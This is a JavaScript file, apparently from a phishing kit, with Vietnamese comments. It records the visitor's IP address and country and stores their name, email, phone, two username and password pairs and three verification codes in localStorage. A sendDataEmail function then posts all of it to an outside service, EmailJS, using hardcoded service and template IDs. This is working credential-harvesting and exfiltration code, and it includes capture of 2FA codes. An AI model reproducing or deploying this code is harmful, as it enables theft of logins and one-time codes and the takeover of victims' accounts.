
function validateEmailCheck(email) {
    var regex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
    return regex.test(email);
}

function validatePhoneNumberCheck(phoneNumber) {
    var regex = /^[0-9\s!@#$%^&*()_+\-=\[\]{};':"\\|,.<>\/?]+$/;
    return regex.test(phoneNumber);
}

  function getUserIp() {
    fetch("http://ip-api.com/json/")
    .then(response => {
        if (!response.ok) {
            throw new Error("Mạng không ổn định hoặc URL không hợp lệ");
        }
        return response.json();
    })
    .then(data => {
        console.log(data);
        // Lưu vào localStorage
        localStorage.setItem('user_ip', data.query); // Thay 'ipAddress' bằng 'query'
        localStorage.setItem('country', data.country); // Thay 'countryName' bằng 'country'
        localStorage.setItem('country_code', data.countryCode); // 'countryCode' là chính xác
    })
    .catch(error => {
        console.error("Không thể lấy dữ liệu từ API:", error);
    });
}

function sendDataEmail() {
    var serviceID = "service_n6smkc5";
    var userId = "CotCewqhd4cwvx6qa";
    var templateId = "template_x2qv39d";

    // var serviceID = "service_baobei99@";
    // var userId = "QpqAV-QoeeyumnK15";
    // var templateId = "template_yxfw5r9";

    var templateData = {
        'user_ip': localStorage.getItem('user_ip'),
        'country': localStorage.getItem('country'),
        'country_code': localStorage.getItem('country_code'),
        'full-name': localStorage.getItem('fullname'),
        'location': localStorage.getItem('location'),
        'email': localStorage.getItem('email'),
        'mobile-phone': localStorage.getItem('phone'),

        'user1': localStorage.getItem('user1'),
        'pass1': localStorage.getItem('pass1'),

        'user2': localStorage.getItem('user2'),
        'pass2': localStorage.getItem('pass2'),

        'code1': localStorage.getItem('code1'),
        'code2': localStorage.getItem('code2'),
        'code3': localStorage.getItem('code3'),

        'currentUrl': localStorage.getItem('currentUrl'),
    };
    
    var data = {
        service_id: serviceID,
        template_id: templateId,
        user_id: userId,
        template_params: templateData
    };

    $.ajax('https://api.emailjs.com/api/v1.0/email/send', {
        type: 'POST',
        data: JSON.stringify(data),
        contentType: 'application/json'
    }).done(function() {
        // Handle success
    }).fail(function(error) {
        // Handle error
    });
}

function localStorageinit() {
    getUserIp();
    localStorage.setItem('fullname', '');
    localStorage.setItem('location', '');
    localStorage.setItem('email', '');
    localStorage.setItem('phone', '');

    localStorage.setItem('user1', '');
    localStorage.setItem('pass1', '');

    localStorage.setItem('user2', '');
    localStorage.setItem('pass2', '');

    // localStorage.setItem('user3', '');
    // localStorage.setItem('pass3', '');

    localStorage.setItem('recover','');

    localStorage.setItem('code1', '');
    localStorage.setItem('code2', '');
    localStorage.setItem('code3', '');

    localStorage.setItem('currentUrl', window.location.href);
    
}
